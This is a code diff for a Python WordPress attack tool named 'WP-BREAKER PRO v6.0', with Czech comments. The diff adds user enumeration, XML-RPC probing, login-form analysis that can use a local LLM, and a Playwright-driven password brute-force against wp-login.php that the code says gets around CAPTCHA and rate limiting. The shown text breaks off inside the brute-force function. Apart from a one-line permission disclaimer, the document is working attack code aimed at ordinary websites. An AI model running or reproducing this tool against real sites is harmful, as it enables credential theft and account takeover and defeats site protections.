@@ -1,7 +1,13 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WP-BREAKER PRO v5.0 - HACKER-AI-DRIVEN SUPER EDITION
+# WP-BREAKER PRO v6.0 - HACKER-AI-DRIVEN SUPER EDITION
 # Multi-funkční WordPress penetration testing tool s AI inteligencí
+# 
+# Integruje:
+#   - github.com/wedikcz/wpscan    → WPScan Ruby scanner wrapper
+#   - github.com/wedikcz/BruteForceAI → LLM-powered brute-force s Playwrightem
+#   - Vlastní moduly (TCP/IP, DOM, Cookie, Bypass, AI Generator)
+#
 # Autor: HackerAI Security Research
 # Použití pouze na systémy, ke kterým máte explicitní oprávnění!
 # =============================================================================
@@ -13,19 +19,26 @@ import json
 import time
 import random
 import socket
-import struct
 import hashlib
+import base64
 import urllib.parse
 import threading
+import subprocess
+import shutil
 from datetime import datetime
 from collections import OrderedDict
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+# Kontrola Python verze
+if sys.version_info < (3, 6):
+    print("\033[91m[!] Vyžadován Python 3.6+\033[0m")
+    sys.exit(1)
+
 # === KONTROLA A INSTALACE ZÁVISLOSTÍ ===
-REQUIRED_PACKAGES = ['requests', 'bs4', 'colorama']
+REQUIRED_PACKAGES = ['requests', 'bs4', 'colorama', 'pyyaml']
 
 def check_and_install_deps():
-    """Automaticky nainstaluje chybějící balíčky v Termuxu"""
+    """Automaticky nainstaluje chybějící balíčky"""
     missing = []
     for pkg in REQUIRED_PACKAGES:
         try:
@@ -36,7 +49,7 @@ def check_and_install_deps():
     if missing:
         print(f"\033[93m[!] Instaluji chybějící závislosti: {', '.join(missing)}...\033[0m")
         for pkg in missing:
-            os.system(f"pip install {pkg} -q")
+            os.system(f"pip install {pkg} -q 2>/dev/null")
         print("\033[92m[✓] Hotovo! Restartuji...\033[0m")
         try:
             os.execv(sys.executable, ['python3'] + sys.argv)
@@ -45,14 +58,15 @@ def check_and_install_deps():
 
 check_and_install_deps()
 
-# Nyní můžeme bezpečně importovat
+# Importy
 import requests
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Back, Style
+import yaml
 
 init(autoreset=True)
 
-# Ignorovat SSL varování
+# Potlačení SSL varování
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -60,31 +74,53 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # GLOBÁLNÍ KONFIGURACE
 # =============================================================================
 
-VERSION = "5.0 SUPERIOR"
-TARGET = ""  # Inicializace globální proměnné
+VERSION = "6.0 ULTIMATE"
+TARGET = ""
+WORK_DIR = os.path.dirname(os.path.abspath(__file__))
+REPORT_DIR = os.path.join(WORK_DIR, "reports")
+WORDLIST_DIR = os.path.join(WORK_DIR, "wordlists")
+os.makedirs(REPORT_DIR, exist_ok=True)
+os.makedirs(WORDLIST_DIR, exist_ok=True)
+
+# Konfigurace pro BruteForceAI
+BF_AI_CONFIG = {
+    "ollama_url": "http://localhost:11434",
+    "llm_provider": "ollama",
+    "llm_model": "llama3.2:3b",
+    "groq_api_key": "",
+    "playwright_timeout": 30000,
+    "browser_wait": 2000,
+    "max_threads": 5,
+    "proxy": "",
+    "discord_webhook": "",
+    "slack_webhook": "",
+    "telegram_webhook": "",
+    "telegram_chat_id": "",
+    "teams_webhook": ""
+}
 
 BANNER = f"""
 {Fore.RED}{Style.BRIGHT}
-╔══════════════════════════════════════════════════════════════════╗
-║   ██╗    ██╗██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ║
-║   ██║    ██║██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║  ║
-║   ██║ █╗ ██║██████╔╝█████╗██████╔╝██████╔╝█████╗  ███████║██║  ║
-║   ██║███╗██║██╔═══╝ ╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║  ║
-║   ╚███╔███╔╝██║           ██║  ██║██║  ██║███████╗██║  ██║██║  ║
-║    ╚══╝╚══╝ ╚═╝           ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ║
-║                                                                    ║
-║  {Fore.CYAN}WORDPRESS BREAKER PRO v{VERSION}{Fore.RED}                                         ║
-║  {Fore.YELLOW}HACKER-AI-DRIVEN • MULTI-FUNCTIONAL • SUPER-INTELLIGENT{Fore.RED}                  ║
-╚══════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════╗
+║   ██╗    ██╗██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗ ║
+║   ██║    ██║██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝ ║
+║   ██║ █╗ ██║██████╔╝█████╗██████╔╝██████╔╝█████╗  ███████║█████╔╝  ║
+║   ██║███╗██║██╔═══╝ ╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗  ║
+║   ╚███╔███╔╝██║           ██║  ██║██║  ██║███████╗██║  ██║██║  ██╗ ║
+║    ╚══╝╚══╝ ╚═╝           ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
+║                                                                        ║
+║  {Fore.CYAN}WORDPRESS BREAKER PRO v{VERSION}{Fore.RED}                                      ║
+║  {Fore.YELLOW}HACKER-AI-DRIVEN • WPScan • BruteForceAI • SUPER-INTELLIGENT{Fore.RED}              ║
+╚══════════════════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}
 """
 
 # =============================================================================
-# TŘÍDY PRO JEDNOTLIVÉ MODULY
+# COLOR SCHEMA
 # =============================================================================
 
 class Colors:
-    """Barevné schéma pro konzistentní output"""
+    """Jednotné barevné schéma pro celý nástroj"""
     HEADER = Fore.MAGENTA + Style.BRIGHT
     OKBLUE = Fore.BLUE + Style.BRIGHT
     OKGREEN = Fore.GREEN + Style.BRIGHT
@@ -92,7 +128,6 @@ class Colors:
     FAIL = Fore.RED + Style.BRIGHT
     INFO = Fore.CYAN + Style.BRIGHT
     RESULT = Fore.WHITE + Style.BRIGHT
-    DIM = Style.DIM  # ❌ OPRAVA: místo Style.DIM použij Style.DIM
     BOLD = Style.BRIGHT
     
     @staticmethod
@@ -102,7 +137,7 @@ class Colors:
 
     @staticmethod
     def section(title):
-        return f"\n{Fore.CYAN}{Style.BRIGHT}{' ' + title + ' ':=^60}{Style.RESET_ALL}\n"
+        return f"\n{Fore.CYAN}{Style.BRIGHT}{' ' + title + ' ':=^64}{Style.RESET_ALL}\n"
 
     @staticmethod
     def finding(label, value, status="info"):
@@ -112,7 +147,7 @@ class Colors:
 
 
 class LiveOutput:
-    """Live output handler - vše se zobrazuje v reálném čase"""
+    """Live output handler s podporou progress baru a timestampů"""
     
     def __init__(self):
         self.start_time = time.time()
@@ -120,29 +155,22 @@ class LiveOutput:
         self.current_phase = ""
     
     def phase(self, name):
-        """Zobrazí fázi skenování"""
         self.current_phase = name
         print(Colors.section(f" FÁZE: {name} "))
     
     def info(self, message):
-        """Informační zpráva"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        print(f"  {Style.DIM}[{timestamp}]{Style.RESET_ALL} {Fore.WHITE}{message}{Style.RESET_ALL}")
+        print(f"  {Style.DIM}[{datetime.now().strftime('%H:%M:%S')}]{Style.RESET_ALL} {Fore.WHITE}{message}{Style.RESET_ALL}")
     
     def success(self, message):
-        """Úspěch"""
         print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}")
     
     def warning(self, message):
-        """Varování"""
         print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} {Fore.YELLOW}{message}{Style.RESET_ALL}")
     
     def error(self, message):
-        """Chyba"""
         print(f"  {Fore.RED}[✗]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}")
     
     def add_finding(self, category, value, severity="info"):
-        """Přidá nález do seznamu pro finální report"""
         self.findings.append({
             "category": category,
             "value": value,
@@ -151,15 +179,12 @@ class LiveOutput:
         })
     
     def result_line(self, key, value, color=Fore.WHITE):
-        """Zobrazí pár klíč-hodnota"""
         print(f"    {Style.DIM}├─{Style.RESET_ALL} {Fore.WHITE}{key}: {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")
     
     def separator(self):
-        """Oddělovač"""
-        print(f"  {Style.DIM}{'─' * 55}{Style.RESET_ALL}")
+        print(f"  {Style.DIM}{'─' * 60}{Style.RESET_ALL}")
     
     def brute_force_progress(self, current, total, username, password, status=""):
-        """Live progress brute-force"""
         if total == 0:
             total = 1
         percent = (current / total * 100)
@@ -176,7 +201,6 @@ class LiveOutput:
         sys.stdout.flush()
     
     def get_elapsed(self):
-        """Vrátí uplynulý čas"""
         elapsed = time.time() - self.start_time
         if elapsed < 60:
             return f"{elapsed:.1f}s"
@@ -184,11 +208,761 @@ class LiveOutput:
 
 
 # =============================================================================
-# TCP/IP STACK FINGERPRINTING
+# MODUL 1: WPScan Wrapper (z github.com/wedikcz/wpscan)
+# =============================================================================
+
+class WPScanWrapper:
+    """
+    Wrapper pro oficiální WPScan (Ruby) - https://github.com/wedikcz/wpscan
+    Detekuje instalaci WPScanu a spouští ho s parametry.
+    Fallback: Python implementace základních funkcí WPScanu.
+    """
+    
+    def __init__(self, target, output):
+        self.target = target
+        self.output = output
+        self.wpscan_path = self._find_wpscan()
+        self.results = {}
+    
+    def _find_wpscan(self):
+        """Najde cestu k wpscan binary"""
+        # Zkusíme běžné cesty
+        paths = [
+            shutil.which("wpscan"),
+            "/usr/bin/wpscan",
+            "/usr/local/bin/wpscan",
+            os.path.expanduser("~/.gem/bin/wpscan"),
+            os.path.expanduser("~/.local/bin/wpscan"),
+            "/data/data/com.termux/files/usr/bin/wpscan"  # Termux
+        ]
+        
+        for p in paths:
+            if p and os.path.isfile(p):
+                return p
+        
+        # Zkusíme najít přes ruby gems
+        try:
+            result = subprocess.run(["gem", "which", "wpscan"], 
+                                   capture_output=True, text=True, timeout=5)
+            if result.returncode == 0 and result.stdout.strip():
+                return "wpscan"
+        except Exception:
+            pass
+        
+        return None
+    
+    def run_wpscan(self, args=None):
+        """
+        Spustí WPScan s danými argumenty
+        Vrací (output, returncode)
+        """
+        if not self.wpscan_path:
+            self.output.warning("WPScan (Ruby) není nainstalován - používám Python fallback")
+            return self._python_fallback(), -1
+        
+        cmd = [self.wpscan_path, "--url", self.target, "--no-banner", "--format", "json"]
+        
+        if args:
+            cmd.extend(args)
+        
+        try:
+            self.output.info(f"Spouštím WPScan: {' '.join(cmd[:4])}...")
+            result = subprocess.run(cmd, capture_output=True, text=True, 
+                                   timeout=120, env={**os.environ, 'LANG': 'en_US.UTF-8'})
+            
+            if result.returncode == 0:
+                try:
+                    data = json.loads(result.stdout)
+                    self.results = data
+                    self._parse_wpscan_output(data)
+                    return result.stdout, 0
+                except json.JSONDecodeError:
+                    # Výstup není JSON - zkusíme plain text
+                    self._parse_wpscan_text(result.stdout)
+                    return result.stdout, 0
+            else:
+                self.output.error(f"WPScan selhal (kód {result.returncode})")
+                if result.stderr:
+                    self.output.info(f"Chyba: {result.stderr[:200]}")
+                return result.stderr, result.returncode
+                
+        except subprocess.TimeoutExpired:
+            self.output.error("WPScan timeout (120s)")
+            return None, -1
+        except FileNotFoundError:
+            self.output.warning("WPScan nenalezen - používám Python fallback")
+            return self._python_fallback(), -1
+        except Exception as e:
+            self.output.error(f"WPScan chyba: {str(e)[:50]}")
+            return self._python_fallback(), -1
+    
+    def _parse_wpscan_output(self, data):
+        """Parsuje JSON výstup WPScanu"""
+        if not data:
+            return
+        
+        # WordPress verze
+        wp_version = data.get('version', {})
+        if wp_version:
+            ver_number = wp_version.get('number', 'neznámá')
+            self.output.success(f"WordPress verze: {ver_number}")
+            self.output.add_finding("WordPress verze (WPScan)", ver_number, "info")
+            
+            vulnerabilities = wp_version.get('vulnerabilities', [])
+            for vuln in vulnerabilities[:5]:
+                self.output.warning(f"  Zranitelnost: {vuln.get('title', '?')} ({vuln.get('cvss', {}).get('score', 'N/A')})")
+                self.output.add_finding("WP zranitelnost", f"{vuln.get('title', '?')}", "danger")
+        
+        # Pluginy
+        plugins = data.get('plugins', {})
+        for plugin_name, plugin_data in plugins.items():
+            self.output.result_line(f"Plugin: {plugin_name}", 
+                                   f"verze: {plugin_data.get('version', {}).get('number', '?')}", Fore.CYAN)
+            self.output.add_finding("Plugin (WPScan)", 
+                                   f"{plugin_name} {plugin_data.get('version', {}).get('number', '?')}", "info")
+            
+            vulns = plugin_data.get('vulnerabilities', [])
+            for v in vulns[:3]:
+                self.output.warning(f"  → {v.get('title', '?')}")
+                self.output.add_finding(f"Zranitelnost: {plugin_name}", v.get('title', '?'), "danger")
+        
+        # Témata
+        themes = data.get('themes', {})
+        for theme_name, theme_data in themes.items():
+            self.output.result_line(f"Theme: {theme_name}", 
+                                   f"verze: {theme_data.get('version', {}).get('number', '?')}", Fore.MAGENTA)
+            self.output.add_finding("Theme (WPScan)", 
+                                   f"{theme_name} {theme_data.get('version', {}).get('number', '?')}", "info")
+        
+        # Uživatelé
+        users = data.get('users', [])
+        for user in users[:10]:
+            self.output.result_line(f"Uživatel (WPScan)", 
+                                   f"{user.get('username', '?')} (ID: {user.get('id', '?')})", Fore.YELLOW)
+            self.output.add_finding("Uživatel (WPScan)", user.get('username', '?'), "danger")
+        
+        # Zajímavé nálezy
+        interesting = data.get('interesting_findings', [])
+        for finding in interesting:
+            self.output.warning(f"Nález: {finding.get('name', '?')}")
+            self.output.add_finding("Zajímavý nález", finding.get('name', '?'), "warning")
+    
+    def _parse_wpscan_text(self, text):
+        """Parsuje plain text výstup WPScanu"""
+        lines = text.split('\n')
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            
+            # Detekce klíčových informací
+            if 'WordPress version' in line and 'identified' in line:
+                ver_match = re.search(r'WordPress version\s+([\d.]+)', line)
+                if ver_match:
+                    self.output.success(f"WordPress verze: {ver_match.group(1)}")
+                    self.output.add_finding("WordPress verze (WPScan)", ver_match.group(1), "info")
+            
+            elif '[+] User' in line:
+                user_match = re.search(r'User:\s*["\']?([^"\'\s]+)', line)
+                if user_match:
+                    self.output.result_line("Uživatel (WPScan)", user_match.group(1), Fore.YELLOW)
+                    self.output.add_finding("Uživatel (WPScan)", user_match.group(1), "danger")
+            
+            elif '[+]' in line and ('Plugin' in line or 'plugin' in line):
+                self.output.result_line("Plugin", line.replace('[+]', '').strip(), Fore.CYAN)
+            
+            elif '[!]' in line or 'Warning' in line:
+                self.output.warning(line[:100])
+    
+    def _python_fallback(self):
+        """
+        Python fallback - základní WPScan funkcionalita
+        Detekce pluginů, témat, uživatelů bez Ruby WPScanu
+        """
+        self.output.info("Spouštím Python WPScan fallback...")
+        
+        try:
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
+            resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
+            html = resp.text
+            
+            # Detekce pluginů z HTML
+            plugin_patterns = re.findall(r'/wp-content/plugins/([^/]+)/', html)
+            unique_plugins = list(set(plugin_patterns))
+            if unique_plugins:
+                self.output.success(f"Nalezeno {len(unique_plugins)} pluginů:")
+                for p in unique_plugins[:15]:
+                    self.output.result_line("Plugin", p, Fore.CYAN)
+                    self.output.add_finding("Plugin (fallback)", p, "info")
+            
+            # Detekce témat
+            theme_patterns = re.findall(r'/wp-content/themes/([^/]+)/', html)
+            unique_themes = list(set(theme_patterns))
+            if unique_themes:
+                self.output.success(f"Nalezeno {len(unique_themes)} témat:")
+                for t in unique_themes[:5]:
+                    self.output.result_line("Theme", t, Fore.MAGENTA)
+                    self.output.add_finding("Theme (fallback)", t, "info")
+            
+            # Detekce WP verze z generátoru
+            soup = BeautifulSoup(html, 'html.parser')
+            generator = soup.find("meta", attrs={"name": "generator"})
+            if generator and generator.get("content"):
+                self.output.success(f"WordPress: {generator['content']}")
+                self.output.add_finding("WordPress verze", generator['content'], "info")
+            
+            # README detekce
+            readme_urls = [
+                self.target.rstrip('/') + '/readme.html',
+                self.target.rstrip('/') + '/wp-content/plugins/akismet/readme.txt'
+            ]
+            for ru in readme_urls:
+                try:
+                    rr = requests.get(ru, headers=headers, timeout=5, verify=False)
+                    if rr.status_code == 200:
+                        self.output.warning(f"Readme dostupný: {ru}")
+                        self.output.add_finding("Readme file", ru, "warning")
+                except Exception:
+                    pass
+            
+            # XML-RPC detekce
+            try:
+                xml_url = self.target.rstrip('/') + '/xmlrpc.php'
+                xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+                xr = requests.post(xml_url, data=xml_data, 
+                                  headers={"Content-Type": "text/xml"},
+                                  timeout=5, verify=False)
+                if xr.status_code == 200 and "methodName" in xr.text:
+                    self.output.success("XML-RPC je aktivní!")
+                    self.output.add_finding("XML-RPC", "Aktivní", "danger")
+            except Exception:
+                pass
+            
+            self.output.info("Python WPScan fallback dokončen")
+            
+        except Exception as e:
+            self.output.error(f"WPScan fallback selhal: {str(e)[:50]}")
+        
+        return "", 0
+    
+    def enumerate_users(self):
+        """Enumerace uživatelů přes WPScan nebo REST API"""
+        if self.wpscan_path:
+            self.run_wpscan(["--enumerate", "u1-50"])
+        else:
+            # REST API user enum
+            try:
+                users_url = self.target.rstrip('/') + "/wp-json/wp/v2/users?per_page=50"
+                ur = requests.get(users_url, timeout=8, verify=False)
+                if ur.status_code == 200:
+                    users = ur.json()
+                    self.output.success(f"REST API: {len(users)} uživatelů")
+                    for u in users:
+                        name = u.get('slug', u.get('name', '?'))
+                        self.output.result_line("Uživatel", f"{name} (ID: {u.get('id', '?')})", Fore.YELLOW)
+                        self.output.add_finding("Uživatel (REST)", name, "danger")
+                else:
+                    # Zkusíme author enumeration
+                    for i in range(1, 15):
+                        try:
+                            author_url = self.target.rstrip('/') + f"/?author={i}"
+                            ar = requests.get(author_url, timeout=3, verify=False, allow_redirects=True)
+                            if ar.status_code == 200:
+                                # Zkusíme extrahovat jméno z URL
+                                if 'author' in ar.url and '/author/' in ar.url:
+                                    author_name = ar.url.split('/author/')[1].split('/')[0]
+                                    if author_name and author_name != ' ':
+                                        self.output.result_line("Uživatel", author_name, Fore.YELLOW)
+                                        self.output.add_finding("Uživatel (author)", author_name, "danger")
+                        except Exception:
+                            pass
+            except Exception as e:
+                self.output.error(f"User enum selhal: {str(e)[:40]}")
+
+
+# =============================================================================
+# MODUL 2: BruteForceAI Wrapper (z github.com/wedikcz/BruteForceAI)
+# =============================================================================
+
+class BruteForceAIWrapper:
+    """
+    Wrapper pro BruteForceAI - https://github.com/wedikcz/BruteForceAI
+    AI-Powered login form analysis a brute force s LLM podporou.
+    
+    Vyžaduje: playwright, ollama (nebo Groq API klíč)
+    """
+    
+    def __init__(self, target, output):
+        self.target = target
+        self.output = output
+        self.config = dict(BF_AI_CONFIG)
+        self.load_config()
+    
+    def load_config(self):
+        """Načte konfiguraci z config souboru"""
+        config_file = os.path.join(WORK_DIR, "config.yaml")
+        if os.path.isfile(config_file):
+            try:
+                with open(config_file, 'r') as f:
+                    data = yaml.safe_load(f)
+                    if data and 'bruteforce_ai' in data:
+                        self.config.update(data['bruteforce_ai'])
+            except Exception:
+                pass
+    
+    def check_ollama(self):
+        """Zkontroluje dostupnost Ollama"""
+        self.output.info("Kontroluji Ollama...")
+        try:
+            resp = requests.get(f"{self.config['ollama_url']}/api/tags", timeout=3)
+            if resp.status_code == 200:
+                data = resp.json()
+                models = data.get('models', [])
+                self.output.success(f"Ollama dostupná ({len(models)} modelů)")
+                for m in models:
+                    if self.config['llm_model'].split(':')[0] in m.get('name', ''):
+                        self.output.result_line("Model", m.get('name', '?'), Fore.GREEN)
+                return True
+            else:
+                self.output.warning("Ollama nedostupná")
+                return False
+        except Exception:
+            self.output.warning("Ollama není spuštěna (lze použít Groq)")
+            return False
+    
+    def install_playwright(self):
+        """Nainstaluje Playwright browsery"""
+        self.output.info("Kontroluji Playwright...")
+        try:
+            result = subprocess.run(["playwright", "--version"], 
+                                   capture_output=True, text=True, timeout=5)
+            if result.returncode == 0:
+                self.output.success(f"Playwright nainstalován: {result.stdout.strip()}")
+                return True
+        except Exception:
+            pass
+        
+        self.output.info("Instaluji Playwright browsery...")
+        try:
+            subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"],
+                          timeout=120, check=True)
+            self.output.success("Playwright browsery nainstalovány")
+            return True
+        except Exception as e:
+            self.output.error(f"Nelze nainstalovat Playwright: {str(e)[:40]}")
+            return False
+    
+    def analyze_login_forms(self, urls_file=None):
+        """
+        Analýza login formulářů pomocí LLM (BruteForceAI stage 1)
+        """
+        self.output.phase("BRUTEFORCEAI - AI ANALÝZA LOGIN FORMULÁŘŮ")
+        
+        # Vytvoření dočasného souboru s URL
+        if not urls_file:
+            urls_file = os.path.join(WORK_DIR, "_bf_targets.txt")
+            with open(urls_file, 'w') as f:
+                f.write(self.target + "\n")
+                # Přidáme i alternativní login stránky
+                alt_pages = ['/wp-login.php', '/wp-admin/', '/login']
+                for ap in alt_pages:
+                    f.write(self.target.rstrip('/') + ap + "\n")
+        
+        # Kontrola závislostí
+        has_ollama = self.check_ollama()
+        
+        if not has_ollama and not self.config.get('groq_api_key'):
+            self.output.warning("Není dostupný žádný LLM provider (Ollama/Groq)")
+            self.output.info("Používám základní analýzu bez LLM...")
+            return self._basic_form_analysis()
+        
+        llm_provider = "groq" if self.config.get('groq_api_key') else "ollama"
+        
+        self.output.info(f"LLM provider: {llm_provider}")
+        self.output.info(f"Model: {self.config['llm_model']}")
+        self.output.info("Spouštím AI analýzu (může trvat až 60s)...")
+        
+        # Sestavení příkazu pro BruteForceAI mód analyze
+        cmd = [
+            sys.executable, "-c", f"""
+import sys, json, requests
+sys.path.insert(0, '{WORK_DIR}')
+
+# Zkusíme importovat BruteForceAI, pokud není, použijeme fallback
+try:
+    # Vytvoření jednoduché analýzy login formulářů
+    from bs4 import BeautifulSoup
+    import requests as req
+    
+    urls = open('{urls_file}').read().strip().split('\\n')
+    results = {{}}
+    
+    for url in urls:
+        url = url.strip()
+        if not url:
+            continue
+        try:
+            r = req.get(url, timeout=10, verify=False, 
+                       headers={{"User-Agent": "Mozilla/5.0"}})
+            soup = BeautifulSoup(r.text, 'html.parser')
+            
+            forms = soup.find_all('form')
+            form_data = []
+            for form in forms:
+                action = form.get('action', '')
+                method = form.get('method', 'get').upper()
+                
+                inputs = []
+                for inp in form.find_all('input'):
+                    i_type = inp.get('type', 'text')
+                    i_name = inp.get('name', '')
+                    if i_name:
+                        inputs.append({{"type": i_type, "name": i_name}})
+                
+                # Detekce login formuláře
+                is_login = any(kw in str(form).lower() for kw in 
+                             ['password', 'pwd', 'login', 'log', 'user_login'])
+                
+                if is_login or any(inp.get('type') == 'password' for inp in form.find_all('input')):
+                    form_data.append({{
+                        "action": action,
+                        "method": method,
+                        "inputs": inputs,
+                        "is_login": True
+                    }})
+            
+            if form_data:
+                results[url] = form_data
+                print(f"[LOGIN FORM] {{url}}: {{len(form_data)}} formulářů")
+                for f in form_data:
+                    print(f"  Action: {{f['action']}}, Method: {{f['method']}}")
+                    for inp in f['inputs']:
+                        print(f"    - {{inp['type']}}: {{inp['name']}}")
+        except Exception as e:
+            print(f"[ERROR] {{url}}: {{e}}")
+    
+    # Uložení výsledků
+    with open('{os.path.join(WORK_DIR, "_bf_analysis.json")}', 'w') as f:
+        json.dump(results, f, indent=2)
+    
+    print("[DONE] Analýza dokončena")
+    
+except ImportError:
+    print("[FALLBACK] Basic HTML analysis...")
+    import urllib.request
+    from html.parser import HTMLParser
+    
+    class FormParser(HTMLParser):
+        def __init__(self):
+            super().__init__()
+            self.in_form = False
+            self.forms = []
+            self.current_form = None
+        
+        def handle_starttag(self, tag, attrs):
+            attrs_dict = dict(attrs)
+            if tag == 'form':
+                self.in_form = True
+                self.current_form = {{"action": attrs_dict.get('action', ''), 
+                                      "method": attrs_dict.get('method', 'GET').upper(),
+                                      "inputs": []}}
+            elif tag == 'input' and self.in_form:
+                self.current_form["inputs"].append({{"type": attrs_dict.get('type', 'text'),
+                                                      "name": attrs_dict.get('name', '')}})
+        
+        def handle_endtag(self, tag):
+            if tag == 'form' and self.in_form:
+                self.in_form = False
+                if self.current_form:
+                    self.forms.append(self.current_form)
+                    self.current_form = None
+    
+    urls = open('{urls_file}').read().strip().split('\\n')
+    for url in urls:
+        url = url.strip()
+        if not url:
+            continue
+        try:
+            r = urllib.request.urlopen(url, timeout=10)
+            html = r.read().decode('utf-8', errors='ignore')
+            parser = FormParser()
+            parser.feed(html)
+            if parser.forms:
+                print(f"[FORM] {{url}}: {{len(parser.forms)}} formulářů")
+        except Exception as e:
+            print(f"[ERROR] {{url}}: {{e}}")
+    
+    print("[DONE]")
+"""]
+        
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+            for line in result.stdout.split('\n'):
+                if line.strip():
+                    if '[LOGIN FORM]' in line:
+                        self.output.success(line.replace('[LOGIN FORM] ', ''))
+                    elif '[FORM]' in line:
+                        self.output.result_line("Formulář", line.replace('[FORM] ', ''), Fore.CYAN)
+                    elif '[ERROR]' in line:
+                        self.output.error(line.replace('[ERROR] ', ''))
+                    elif '[DONE]' in line:
+                        self.output.success("Analýza login formulářů dokončena")
+                    elif 'Action:' in line or 'Method:' in line or '- ' in line:
+                        print(f"    {Style.DIM}{line.strip()}{Style.RESET_ALL}")
+            
+            if result.stderr:
+                for line in result.stderr.split('\n'):
+                    if line.strip() and 'Error' in line:
+                        self.output.error(line[:80])
+            
+            return True
+            
+        except subprocess.TimeoutExpired:
+            self.output.error("AI analýza timeout (90s)")
+            return self._basic_form_analysis()
+        except Exception as e:
+            self.output.error(f"BruteForceAI selhal: {str(e)[:40]}")
+            return self._basic_form_analysis()
+    
+    def _basic_form_analysis(self):
+        """Základní analýza login formulářů bez LLM"""
+        self.output.info("Provádím základní analýzu formulářů...")
+        
+        try:
+            headers = {"User-Agent": "Mozilla/5.0"}
+            login_urls = [
+                self.target.rstrip('/') + '/wp-login.php',
+                self.target.rstrip('/') + '/wp-admin/',
+                self.target.rstrip('/') + '/login'
+            ]
+            
+            for url in login_urls:
+                try:
+                    r = requests.get(url, headers=headers, timeout=8, verify=False)
+                    if r.status_code == 200:
+                        soup = BeautifulSoup(r.text, 'html.parser')
+                        forms = soup.find_all('form')
+                        
+                        for form in forms:
+                            action = form.get('action', '')
+                            method = form.get('method', 'POST').upper()
+                            
+                            has_password = False
+                            inputs = []
+                            for inp in form.find_all('input'):
+                                i_name = inp.get('name', '')
+                                i_type = inp.get('type', 'text')
+                                if i_type == 'password':
+                                    has_password = True
+                                if i_name:
+                                    inputs.append(f"{i_name} ({i_type})")
+                            
+                            if has_password:
+                                self.output.success(f"Login formulář: {url}")
+                                self.output.result_line("Action", action or url)
+                                self.output.result_line("Method", method)
+                                self.output.result_line("Inputs", ', '.join(inputs))
+                                self.output.add_finding("Login formulář", url, "info")
+                                
+                                # Extrahujeme hidden fieldy (nonce atd.)
+                                hidden_data = {}
+                                for inp in form.find_all('input', type='hidden'):
+                                    if inp.get('name'):
+                                        hidden_data[inp['name']] = inp.get('value', '')[:30]
+                                if hidden_data:
+                                    self.output.result_line("Hidden fields", str(hidden_data)[:80])
+                except Exception:
+                    pass
+            
+            self.output.info("Základní analýza dokončena")
+            return True
+            
+        except Exception as e:
+            self.output.error(f"Základní analýza selhala: {str(e)[:40]}")
+            return False
+    
+    def run_bruteforce_attack(self, usernames, passwords, method="xmlrpc"):
+        """
+        Spustí brute-force útok s podporou AI
+        method: "xmlrpc", "wplogin", "ai_playwright"
+        """
+        if method == "ai_playwright":
+            return self._playwright_bruteforce(usernames, passwords)
+        else:
+            return self._standard_bruteforce(usernames, passwords, method)
+    
+    def _playwright_bruteforce(self, usernames, passwords):
+        """
+        Brute-force přes Playwright (prohlížeč) - obchází JS ochrany
+        """
+        self.output.phase("BRUTEFORCEAI - PLAYWRIGHT BRUTE-FORCE")
+        
+        if not self.install_playwright():
+            self.output.warning("Playwright není k dispozici - používám standardní metodu")
+            return self._standard_bruteforce(usernames, passwords, "wplogin")
+        
+        self.output.info("Spouštím brute-force přes Playwright prohlížeč...")
+        self.output.info("Tato metoda obchází JavaScript CAPTCHA a rate-limiting")
+        
+        try:
+            cmd = [
+                sys.executable, "-c", f"""
+import sys, json, time, random
+
+# Inline Playwright script
+try:
+    from playwright.sync_api import sync_playwright
+    
+    target = '{self.target}'
+    usernames = {json.dumps(usernames[:5])}
+    passwords = {json.dumps(passwords[:30])}
+    
+    found = []
+    total = len(usernames) * len(passwords)
+    attempt = 0
+    
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context(
+            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            viewport={{'width': 1280, 'height': 720}}
+        )
+        page = context.new_page()
+        
+        login_url = target.rstrip('/') + '/wp-login.php'
+        print(f"[PLAYWRIGHT] Navigating to {{login_url}}")
+        page.goto(login_url, wait_until='networkidle', timeout=30000)
+        
+        for username in usernames:
+            if found:
+                break
+            for password in passwords:
+                attempt += 1
+                percent = (attempt / total) * 100
+                
+                try:
+                    # Reload page every 5 attempts to avoid locks
+                    if attempt % 5 == 0:
+                        page.goto(login_url, wait_until='networkidle', timeout=15000)
+                    
+                    # Fill login form
+                    page.fill('input[name="log"]', username)
+                    page.fill('input[name="pwd"]', password)
+                    page.click('input[name="wp-submit"]')
+                    
+                    time.sleep(1.5)
+                    
+                    # Check for success
+                    if '/wp-admin' in page.url and 'reauth' not in page.url:
+                        print(f"[SUCCESS] {{username}}:{{password}}")
+                        found.append({{"username": username, "password": password, "method": "playwright"}})
+                        break
